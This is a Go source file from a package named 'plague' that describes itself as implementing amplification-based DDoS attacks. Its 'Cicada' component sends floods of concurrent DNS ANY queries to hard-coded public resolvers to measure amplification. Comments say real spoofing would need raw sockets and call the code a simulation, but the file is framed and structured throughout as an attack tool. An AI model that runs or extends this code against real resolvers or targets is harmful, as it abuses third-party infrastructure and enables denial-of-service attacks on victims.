// Package plague implements amplification-based DDoS attacks.
// These attacks use reflector servers to amplify traffic to targets.
package plague

import (
	"context"
	"fmt"
	"net"
	"sync"
	"sync/atomic"
	"time"
)

// AttackOpts contains options for amplification attacks.
type AttackOpts struct {
	Rounds      int           // Number of requests to send
	Concurrency int           // Number of concurrent workers
	Delay       time.Duration // Delay between requests
	Verbose     bool          // Enable verbose output
}

// Result contains the results of an amplification attack.
type Result struct {
	TotalRequests int           // Total requests sent
	Successful    int           // Successful requests
	Failed        int           // Failed requests
	Duration      time.Duration // Total attack duration
	Amplification float64       // Estimated amplification factor
}

// Cicada implements DNS amplification attack (TACHYON).
// Sends DNS queries to open resolvers with the target as the spoofed source.
// Note: True spoofing requires raw sockets. This implementation queries
// resolvers and measures amplification potential.
type Cicada struct {
	resolvers []string
}

// NewCicada creates a new Cicada DNS amplification attack.
func NewCicada(resolvers []string) *Cicada {
	if len(resolvers) == 0 {
		// Default public DNS resolvers
		resolvers = []string{
			"8.8.8.8:53",
			"8.8.4.4:53",
			"1.1.1.1:53",
			"1.0.0.1:53",
			"9.9.9.9:53",
			"208.67.222.222:53",
			"208.67.220.220:53",
		}
	}
	return &Cicada{resolvers: resolvers}
}

// Name returns the attack name.
func (c *Cicada) Name() string {
	return "Cicada"
}

// Description returns a brief description.
func (c *Cicada) Description() string {
	return "Cicada Song - DNS amplification (one call, massive echo)"
}

// Attack executes the DNS amplification attack.
// In a real attack, spoofed UDP packets would be sent. This simulation
// demonstrates the amplification by measuring response sizes.
func (c *Cicada) Attack(ctx context.Context, target string, opts AttackOpts) (*Result, error) {
	if opts.Concurrency <= 0 {
		opts.Concurrency = 50
	}
	if opts.Rounds <= 0 {
		opts.Rounds = 1000
	}

	var (
		successful    atomic.Int64
		failed        atomic.Int64
		completed     atomic.Int64
		totalRespSize atomic.Int64
	)

	start := time.Now()

	// DNS query for ANY record (maximum amplification)
	// Query structure: header + question for "." (root) ANY record
	dnsQuery := buildDNSQuery(target)
	querySize := len(dnsQuery)

	jobs := make(chan int, opts.Rounds)
	var wg sync.WaitGroup

	for i := 0; i < opts.Concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case idx, ok := <-jobs:
					if !ok {
						return
					}
					resolver := c.resolvers[idx%len(c.resolvers)]
					respSize, ok := c.sendDNSQuery(ctx, resolver, dnsQuery)
					if ok {
						successful.Add(1)
						totalRespSize.Add(int64(respSize))
					} else {
						failed.Add(1)
					}
					current := completed.Add(1)

					if opts.Verbose && current%100 == 0 {
						fmt.Printf("\r   Progress: %d/%d queries", current, opts.Rounds)
					}

					if opts.Delay > 0 {
						time.Sleep(opts.Delay)
					}
				}
			}
		}()
	}

	for i := 0; i < opts.Rounds; i++ {
		select {
		case <-ctx.Done():
			break
		case jobs <- i:
		}
	}
	close(jobs)

	wg.Wait()

	if opts.Verbose {
		fmt.Println()
	}

	// Calculate amplification factor
	ampFactor := float64(0)
	if successful.Load() > 0 {
		avgRespSize := float64(totalRespSize.Load()) / float64(successful.Load())
		ampFactor = avgRespSize / float64(querySize)
	}

	return &Result{
		TotalRequests: int(completed.Load()),
		Successful:    int(successful.Load()),
		Failed:        int(failed.Load()),
		Duration:      time.Since(start),
		Amplification: ampFactor,
	}, nil
}

// sendDNSQuery sends a DNS query and returns response size.
func (c *Cicada) sendDNSQuery(ctx context.Context, resolver string, query []byte) (int, bool) {
	conn, err := net.DialTimeout("udp", resolver, 2*time.Second)
	if err != nil {
		return 0, false
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(2 * time.Second))

	_, err = conn.Write(query)
	if err != nil {
		return 0, false
	}

	buf := make([]byte, 4096)
	n, err := conn.Read(buf)
	if err != nil {
		return 0, false
	}

	return n, true
}

// buildDNSQuery builds a DNS ANY query for maximum amplification.
func buildDNSQuery(domain string) []byte {
	// DNS header
	header := []byte{
		0x00, 0x01, // Transaction ID
		0x01, 0x00, // Flags: standard query with recursion desired
		0x00, 0x01, // Questions: 1
		0x00, 0x00, // Answer RRs: 0
		0x00, 0x00, // Authority RRs: 0
		0x00, 0x00, // Additional RRs: 0
	}

	// Build question section for domain
	question := encodeDomainName(domain)
	question = append(question, 0x00, 0xff) // Type: ANY (255)
	question = append(question, 0x00, 0x01) // Class: IN (1)

	return append(header, question...)
}

// encodeDomainName encodes a domain name in DNS format.
func encodeDomainName(domain string) []byte {
	result := []byte{}
	labels := splitDomain(domain)
	for _, label := range labels {
		result = append(result, byte(len(label)))
		result = append(result, []byte(label)...)
	}
	result = append(result, 0x00) // Null terminator
	return result
}

// splitDomain splits a domain into labels.
func splitDomain(domain string) []string {
	result := []string{}
	current := ""
	for _, c := range domain {
		if c == '.' {
			if current != "" {
				result = append(result, current)
				current = ""
			}
		} else {
			current += string(c)
		}
	}
	if current != "" {
		result = append(result, current)
	}
	return result
}
